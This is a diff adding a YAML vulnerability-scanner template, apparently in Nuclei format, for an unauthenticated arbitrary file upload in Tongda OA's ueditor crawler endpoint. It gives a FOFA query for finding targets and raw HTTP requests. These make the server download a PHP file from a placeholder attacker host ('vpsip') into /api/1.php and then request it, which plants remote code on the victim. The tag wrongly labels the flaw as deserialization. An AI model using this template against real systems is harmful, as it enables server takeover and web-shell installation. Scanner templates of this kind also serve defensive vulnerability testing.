@@ -1,0 +1,38 @@
+id: TongDa-14
+
+info:
+  name: 通达OA /module/ueditor/php/action_crawler.php存在前台任意文件上传漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    通达OA /module/ueditor/php/action_crawler.php存在前台任意文件上传漏洞
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="通达OA网络智能办公系统"
+  tags: TongDa,OA,反序列化
+request:
+  - raw:
+      - |
+        POST /module/ueditor/php/action_crawler.php HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+        Content-Length: 197
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+  
+        CONFIG[catcherPathFormat]=/api/1&CONFIG[catcherMaxSize]=100000&CONFIG[catcherAllowFiles][]=.php&CONFIG[catcherAllowFiles][]=.ico&CONFIG[catcherFieldName]=file&file[]=http://vpsip/2.php
+      - |
+        GET /api/1.php HTTP/1.1
+        Host: {{RootURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Content-Length: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_1
+        status:
+          - 200
